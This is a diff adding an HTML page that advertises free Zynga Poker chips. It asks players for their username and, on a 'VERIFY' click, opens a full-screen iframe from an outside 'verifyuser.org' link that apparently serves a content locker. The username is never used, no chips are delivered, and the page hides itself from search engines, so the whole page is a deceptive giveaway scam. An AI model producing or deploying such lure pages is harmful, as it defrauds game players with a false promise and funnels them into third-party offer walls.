@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Zynga Poker Free Chips</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      #main {
+        background: url("/mainbg.jpeg") no-repeat center/cover;
+      }
+
+      /* Overlay and iframe styling */
+      #iframe-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000; /* Ensure it appears on top */
+        display: none; /* Initially hidden */
+      }
+
+      #iframe-overlay iframe {
+        width: 80%; /* Adjust as needed */
+        height: 80%; /* Adjust as needed */
+        border: none;
+        background: transparent; /* Ensure iframe background is transparent */
+      }
+    </style>
+    <meta name="robots" content="noindex, nofollow" />
+  </head>
+  <body>
+    <div id="iframe-overlay" class="iframe-overlay"></div>
+    <div
+      id="main"
+      class="h-screen flex justify-center items-center text-center relative"
+    >
+      <div
+        class="absolute text-white bg-black rounded-lg p-5 lg:w-2/6 w-fit mx-5"
+      >
+        <h1 class="mb-5 text-3xl font-bold flex items-center justify-center">
+          Zynga Poker Chips
+        </h1>
+        <label for=""
+          >Enter your
+          <strong class="text-yellow-500">Zynga Poker</strong> Username and
+          click verify</label
+        >
+        <input
+          type="email"
+          class="rounded bg-gray-300 px-3 py-2 mt-3 w-96 text-black"
+          placeholder="Enter username..."
+        />
+        <p>
+          <br />After verification, check your game account for<br />
+          <strong
+            ><span class="text-orange-600">Free Zynga Poker Chips</span
+            >.</strong
+          >
+          <br />
+          Get ready to hit the tables and boost your bankroll in style! 🃏
+        </p>
+
+        <button
+          class="bg-yellow-500 px-5 py-2 mt-5 hover:bg-white hover:text-yellow-700"
+          onclick="verify()"
+        >
+          VERIFY
+        </button>
+      </div>
+    </div>
+  </body>
+
+  <script>
+    function verify() {
+      // window.location.href = "https://verifyuser.org/cl/i/996ngr";
+
+      // Show the loader
+      document.getElementById("iframe-overlay").innerHTML =
+        '<iframe id="lockeriframe" src="https://verifyuser.org/cl/i/996ngr" frameborder="0" class="second-row"></iframe>';
+
+      // Insert the iframe after a delay to simulate loading time
+      setTimeout(function () {
+        document.getElementById("iframe-overlay").style.display = "flex"; // Show iframe overlay
+      }, 100); // Adjust the delay time as needed
+    }
+  </script>
+</html>
